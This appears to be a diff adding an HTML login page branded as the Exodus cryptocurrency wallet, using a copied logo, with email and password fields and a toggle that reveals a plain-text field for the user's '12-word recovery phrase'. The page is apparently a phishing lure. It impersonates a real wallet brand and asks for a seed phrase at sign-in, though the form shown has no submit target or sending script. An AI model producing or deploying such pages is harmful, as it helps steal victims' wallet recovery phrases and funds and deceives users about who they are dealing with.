@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en" x-data="{ showPassword:false, usePassphrase:false }">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exodus Login</title>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Alpine.js -->
+    <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        body {
+            background: linear-gradient(180deg, #121425, #101126);
+        }
+        
+        .toggle-password {
+            transition: all 0.2s ease;
+        }
+        
+        .toggle-password:hover {
+            transform: scale(1.1);
+        }
+        
+        .passphrase-toggle {
+            transition: all 0.3s ease;
+        }
+        
+        .passphrase-toggle:hover {
+            background-color: rgba(99, 102, 241, 0.1);
+        }
+        
+        .form-input {
+            transition: all 0.2s ease;
+        }
+        
+        .form-input:focus {
+            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.5);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex flex-col px-4 sm:px-6 justify-center text-white">
+
+    <!-- Header -->
+    <header class="absolute top-6 left-6">
+        <button class="text-white text-2xl hover:text-indigo-300 transition-colors">
+            <i class="fas fa-arrow-left"></i>
+        </button>
+    </header>
+
+    <!-- Logo -->
+    <div class="flex justify-center mb-6">
+        <div class="text-4xl font-extrabold text-indigo-400">
+            <img src="./exodus-removebg-preview.png" alt="Exodus Logo" width="180px">
+        </div>
+    </div>
+
+    <!-- Title -->
+    <h1 class="text-center text-3xl font-bold mb-2">
+        Welcome back!
+    </h1>
+    
+    <p class="text-center text-gray-400 mb-8">
+        Sign in to your Exodus account
+    </p>
+
+    <!-- Form -->
+    <form class="space-y-6 w-full max-w-md mx-auto">
+
+        <!-- Email Field -->
+        <div>
+            <label for="email" class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
+            <input 
+                id="email"
+                type="email" 
+                placeholder="Enter your email address"
+                class="w-full px-4 py-4 rounded-xl bg-[#1A1C33] text-white placeholder-gray-400 focus:outline-none form-input"/>
+        </div>
+
+        <!-- Password Field -->
+        <div>
+            <label for="password" class="block text-sm font-medium text-gray-300 mb-2">Password</label>
+            <div class="relative">
+                <input 
+                    id="password"
+                    :type="showPassword ? 'text' : 'password'" 
+                    placeholder="Enter your password"
+                    class="w-full px-4 py-4 rounded-xl bg-[#1A1C33] text-white placeholder-gray-400 focus:outline-none form-input"/>
+                
+                <button 
+                    type="button" 
+                    @click="showPassword = !showPassword"
+                    class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white toggle-password">
+                    <i :class="showPassword ? 'fas fa-eye-slash' : 'fas fa-eye'"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Passphrase Option -->
+        <div class="flex items-center justify-between">
+            <div class="flex items-center">
+                <button 
+                    type="button" 
+                    @click="usePassphrase = !usePassphrase"
+                    class="flex items-center space-x-2 text-sm text-gray-300 hover:text-indigo-300 passphrase-toggle px-3 py-2 rounded-lg">
+                    <i class="fas fa-key text-indigo-400"></i>
+                    <span class="text-indigo-400">Use Passphrase</span>
+                </button>
+            </div>
+            
+            <a href="#" class="text-indigo-400 text-sm hover:underline transition-colors">Forgot Password?</a>
+        </div>
+
+        <!-- Passphrase Field (Conditional) -->
+        <div x-show="usePassphrase" x-transition:enter="transition ease-out duration-300" 
+             x-transition:enter-start="opacity-0 transform -translate-y-2" 
+             x-transition:enter-end="opacity-100 transform translate-y-0">
+            <label for="passphrase" class="block text-sm font-medium text-gray-300 mb-2">Passphrase</label>
+            <div class="relative">
+                <input 
+                    id="passphrase"
+                    type="text" 
+                    placeholder="Enter your passphrase"
+                    class="w-full px-4 py-4 rounded-xl bg-[#1A1C33] text-white placeholder-gray-400 focus:outline-none form-input"/>
+                
+                <div class="absolute right-4 top-1/2 -translate-y-1/2 text-indigo-400">
+                    <i class="fas fa-key"></i>
+                </div>
+            </div>
+            <p class="text-xs text-gray-400 mt-2">
+                Your passphrase is a 12-word recovery phrase for your Exodus wallet
+            </p>
+        </div>
+
+        <!-- Sign In Button -->
+        <button 
+            type="submit"
+            class="w-full py-4 bg-indigo-600 rounded-full text-lg font-semibold hover:bg-indigo-700 transition-all duration-300 transform hover:-translate-y-0.5 shadow-lg hover:shadow-indigo-500/25">
+            Sign in
+        </button>
+    </form>
+
+    <!-- Sign Up -->
+    <div class="text-center mt-8">
+        <p class="text-gray-400 text-sm">No account?</p>
+        <a href="#" class="text-indigo-400 font-semibold hover:underline transition-colors">Create an account</a>
+    </div>
+
+    <!-- Footer -->
+    <footer class="absolute bottom-6 left-0 right-0 text-center">
+        <p class="text-gray-500 text-xs">© 2023 Exodus. All rights reserved.</p>
+    </footer>
+
+</body>
+</html>
